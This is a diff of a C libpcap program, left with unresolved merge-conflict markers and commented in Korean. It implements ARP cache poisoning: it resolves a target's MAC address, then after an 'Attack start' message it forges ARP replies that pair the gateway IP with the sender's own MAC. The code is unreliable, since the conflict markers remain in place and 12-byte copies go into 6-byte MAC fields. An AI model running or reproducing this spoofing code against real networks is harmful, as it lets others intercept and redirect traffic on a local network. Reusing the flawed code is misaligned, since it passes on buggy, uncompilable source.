@@ -12,9 +12,14 @@
 #include <linux/rtnetlink.h>
 #include <arpa/inet.h>
 #include "networkinfo.h"
+<<<<<<< HEAD
 #include "arp.h"
 
 int gett_mac(const u_char *packet, u_char *t_mac, char* t_ip);
+=======
+
+int callback(const u_char *packet, u_char *t_mac, char* t_ip);
+>>>>>>> 9ed05a66cf46a8903f67cd3c60c4a7c896549312
 
 int main(int argc, char **argv){
     char *dev;
@@ -43,15 +48,47 @@ int main(int argc, char **argv){
         printf("%s\n", errbuf);
         exit(1);
     }
+<<<<<<< HEAD
     printf("Target IP Address: ");
     scanf("%s", t_ip);
     makearpreq(dev, sp_buf, t_ip);
+=======
+    printf("Target IP Adress: ");
+    scanf("%s", t_ip);
+    getMIPAddress(dev, s_ip);
+    getMMACAddress(dev, s_mac);
+    getGIPAddress(dev, g_ip);
+    printf("Source IP Adress: %s\n", s_ip);
+    printf("Gateway IP Adress: %s\n", g_ip);
+
+    struct ether_header etheh;
+
+    cp = sp_buf;
+    memcpy(etheh.ether_dhost, t_mac, 12);
+    memcpy(etheh.ether_shost, s_mac, 12);
+    etheh.ether_type = htons(ETHERTYPE_ARP);
+    memcpy(cp, &etheh, sizeof(struct ether_header));
+    cp += sizeof(struct ether_header);
+
+    struct ether_arp arph;
+    memcpy(arph.arp_sha, s_mac, 12);
+    inet_aton(s_ip, &(arph.arp_spa));
+    memcpy(arph.arp_tha, t_mac, 12);
+    inet_aton(t_ip, &(arph.arp_tpa));
+    arph.ea_hdr.ar_hln = 6;
+    arph.ea_hdr.ar_hrd = htons(1);
+    arph.ea_hdr.ar_pln = 4;
+    arph.ea_hdr.ar_pro = htons(0x0800);
+    arph.ea_hdr.ar_op = htons(1);
+    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅
+>>>>>>> 9ed05a66cf46a8903f67cd3c60c4a7c896549312
 
     if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
         pcap_perror(pcd,0);
         pcap_close(pcd);
         exit(1);
     };
+<<<<<<< HEAD
     // 패킷이 캡쳐되면 callback함수를 실행한다.
     while(1){
         packet = pcap_next(pcd, &hdr);
@@ -60,6 +97,33 @@ int main(int argc, char **argv){
     }
 
     makearprep(dev, sp_buf, t_ip, t_mac);
+=======
+
+
+    // 패킷이 캡쳐되면 callback함수를 실행한다.
+    while(1){
+
+        packet = pcap_next(pcd, &hdr);
+        if(callback(packet, t_mac, t_ip) == 1)
+            break;
+    }
+    printf("Source MAC Address: ");
+    for(int i=0; i<5; i++)
+        printf("%2x:", s_mac[i]);
+    printf("%2x\n", s_mac[5]);
+    printf("Target MAC Address: ");
+    for(int i=0; i<5; i++)
+        printf("%2x:", t_mac[i]);
+    printf("%2x\n", t_mac[5]);
+
+    printf("Attack start\n"); //타겟에 게이트웨이 ip와 자신의 mac을 담은 arp reply패킷을 전송한다
+    inet_aton(g_ip, &(arph.arp_spa));
+    arph.ea_hdr.ar_op = htons(2);
+
+    cp = sp_buf;
+    cp += sizeof(struct ether_header);
+    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅
+>>>>>>> 9ed05a66cf46a8903f67cd3c60c4a7c896549312
 
     while(1){
         printf("send arp reply packet\n");
@@ -72,7 +136,11 @@ int main(int argc, char **argv){
     }
     return 0;
 }
+<<<<<<< HEAD
 int gett_mac(const u_char *packet, u_char * t_mac, char* t_ip){
+=======
+int callback(const u_char *packet, u_char * t_mac, char* t_ip){
+>>>>>>> 9ed05a66cf46a8903f67cd3c60c4a7c896549312
     struct ether_header *etheh; // Ethernet 헤더 구조체
     unsigned short ether_type;
 
